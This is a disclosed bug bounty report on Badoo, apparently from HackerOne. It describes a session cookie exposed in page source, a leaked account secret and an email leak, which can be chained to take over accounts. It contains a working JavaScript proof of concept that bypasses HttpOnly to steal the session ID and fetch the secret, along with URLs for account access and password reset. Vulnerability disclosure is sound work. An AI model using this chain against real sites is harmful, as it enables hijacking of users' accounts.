@@ -1,0 +1,47 @@
+ReportLink:https://hackerone.com/reports/119794
+WeaknessName:Improper Authentication - Generic
+Reporter:https://hackerone.com/ngocdh
+ReportedTo:Badoo(badoo)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:12.04.2016 19:20:42
+
+Summary:
+Two issues:
+
+Session cookie is returned in HTML source code of /encounters page, which would allow an XSS attacker to steal it, even if httpOnly is activated.
+A secret value, present in HTML source code of some api.phtml pages, can be used to modify user's password without knowing actual one.
+Privacy issue : user's email address, hiden in user interface, can be found when sending a POST request to /api.phtml?SERVER_APP_STARTUP
+Combining these three issues, an XSS attacker can steal session cookie and modify user's password without knowing actual one.
+
+The following POC (works in Chrome latest version) bypasses HttpOnly to retrieve the session cookie, and then do a POST to /api.phtml to retrieve the secret value (see Screenshot):
+
+/POC - BEGIN/
+var xmlhttp = new XMLHttpRequest();
+xmlhttp.onreadystatechange = function() {
+if (xmlhttp.readyState == XMLHttpRequest.DONE) {
+a=xmlhttp.responseText.substr(xmlhttp.responseText.search("session_id\":\"")+13);b=a.substr(0,a.search("\""));//alert(b);
+var xmlhttp2 = new XMLHttpRequest();
+xmlhttp2.onreadystatechange = function() {
+if (xmlhttp2.readyState == XMLHttpRequest.DONE) {
+a2=xmlhttp2.responseText.substr(xmlhttp2.responseText.search("secret=")+7);b2=a2.substr(0,a2.search("\""));alert(b2);
+}
+}
+xmlhttp2.open("POST", "/api.phtml?SERVER_GET_USER");
+xmlhttp2.setRequestHeader("Content-Type", "json");
+xmlhttp2.setRequestHeader("X-Session-id", b);
+xmlhttp2.send(JSON.stringify({"$gpb":"badoo.bma.BadooMessage","version":1,"message_type":403,"message_id":13,"body":[{"$gpb":"badoo.bma.MessageBody","message_type":403,"server_get_user":{"$gpb":"badoo.bma.ServerGetUser","user_id":$s.user_id.toString(),"user_field_filter":{"$gpb":"badoo.bma.UserFieldFilter","projection":[100]},"client_source":0}}]}));
+}
+}
+xmlhttp.open("GET", "/encounters",true);
+xmlhttp.send();
+/POC - END/
+
+Note that with the "secret" value and user's UID, an attacker can access user's account anytime using the following URL:
+https://eu1.badoo.com/access.phtml?UID=[UID]&secret=[secret]
+
+Similarily, user's email can be retrieved by send POST request to /api.phtml?SERVER_APP_STARTUP.
+
+The attacker can then go to the following URL to change user's password:
+https://eu1.badoo.com/forgot_enter.phtml?code=[secret]&email=[email]
